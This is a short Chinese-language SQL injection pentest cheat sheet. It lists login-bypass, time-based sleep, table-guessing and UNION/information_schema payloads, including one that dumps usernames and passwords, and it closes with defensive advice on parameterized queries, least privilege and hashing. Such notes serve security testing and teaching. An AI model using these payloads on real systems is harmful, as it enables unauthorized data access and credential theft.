## Sql Injection


### Sql Injection 渗透测试

1、登录框（一般不存在）
```
admin'-- -
' or 1=1 #
```

2、模糊查询输入框（因多条件，开发很容易使用动态拼接sql来组装查询语句）
```
%') and sleep(1);-- -
%') and sleep(1); #
```

3、URL表达式(?id=123)
```
' or '1' = 1'
可以更进一步猜表名
'or 1=(select count(*) from job) #
```

4、在列表页面可以爆表（通过联合查询回显）
```
union select table_name from information_schema.tables
```

同理可爆字段、数据库用户信息

常用渗透语句
```
select schema_name from information_schema.schemata
select column_name from information_schema.columns where table_name='users'
select group_concat(username,':',password) from users
```

`sleep(1)`也就是每条记录sleep1秒


### Sql Injection 注意事项

1. 永远不要使用动态拼装sql，可以使用参数化的sql
2. 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接
3. 不要把机密信息直接存放，加密或者hash掉密码和敏感的信息
